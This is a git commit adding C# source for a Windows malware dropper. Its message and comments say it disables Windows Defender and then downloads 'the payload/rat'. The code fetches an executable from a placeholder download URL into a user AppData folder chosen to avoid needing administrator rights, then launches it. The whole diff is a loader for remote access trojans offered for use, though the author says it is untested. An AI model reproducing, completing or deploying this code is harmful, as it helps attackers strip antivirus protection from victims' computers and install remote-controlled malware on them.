67be996b0729372434db3d4e5e0578e05b9ed126
icorex <38869243+notkohlrexo@users.noreply.github.com>
2019-06-11 23:49:37 +0200

    Disable Windows Defender & Download File
    The program disables windows defender & after that it's downloading the main file. I didn't test it yet - so I don't know if it's 100% working.

---
+++ DisableDefender-DownloadFile/DisableDefender-DownloadFile/Download.cs
@@ -0,0 +1,26 @@
+﻿using System;
+using System.Net;
+
+namespace DisableDefender_DownloadFile
+{
+    public class Download
+    {
+        public void DownloadFile(string sourceUrl, string targetFolder)
+        {
+            WebClient downloader = new WebClient();
+
+            downloader.Headers.Add("User-Agent", "Mozilla/4.0 (compatible; MSIE 8.0)");
+
+            downloader.DownloadProgressChanged +=
+                new DownloadProgressChangedEventHandler(Downloader_DownloadProgressChanged);
+
+            downloader.DownloadFileAsync(new Uri(sourceUrl), targetFolder);
+
+            while (downloader.IsBusy) { }
+        }
+
+        private void Downloader_DownloadProgressChanged(object sender, DownloadProgressChangedEventArgs e)
+        {
+        }
+    }
+}
---
+++ DisableDefender-DownloadFile/DisableDefender-DownloadFile/Program.cs
@@ -0,0 +1,41 @@
+﻿using System;
+using System.Windows.Forms;
+using WindowsDefender_Downloader;
+
+namespace DisableDefender_DownloadFile
+{
+    static class Program
+    {
+        static void Main()
+        {
+            //disable windows defender & download the payload/rat
+            Disabledefender.Run();
+            Delay(1000);
+            string URL = "https://somedownloadlink.com/someexename.exe"; //DIRECT DOWNLOAD LINK
+            string FILE = @"C:\Users\" + Environment.UserName + @"\AppData\Roaming\Microsoft\Windows\FILE.exe"; // SAVE AS EXE // PATH DOESN'T REQUIRE ADMINISTRATOR RIGHTS
+            Download downloadasync = new Download();
+            downloadasync.DownloadFile(URL, FILE);
+
+            // start the file
+            System.Diagnostics.Process.Start(@"C:\Users\" + Environment.UserName + @"\AppData\Roaming\Microsoft\Windows\FILE.exe"); // STARTING EXE // PATH DOESN'T REQUIRE ADMINISTRATOR RIGHTS
+        }
+
+        public static void Delay(int milliseconds)
+        {
+            System.Windows.Forms.Timer timer1 = new System.Windows.Forms.Timer();
+            if (milliseconds == 0 || milliseconds < 0) return;
+            timer1.Interval = milliseconds;
+            timer1.Enabled = true;
+            timer1.Start();
+            timer1.Tick += (s, e) =>
+            {
+                timer1.Enabled = false;
+                timer1.Stop();
+            };
+            while (timer1.Enabled)
+            {
+                Application.DoEvents();
+            }
+        }
+    }
+}
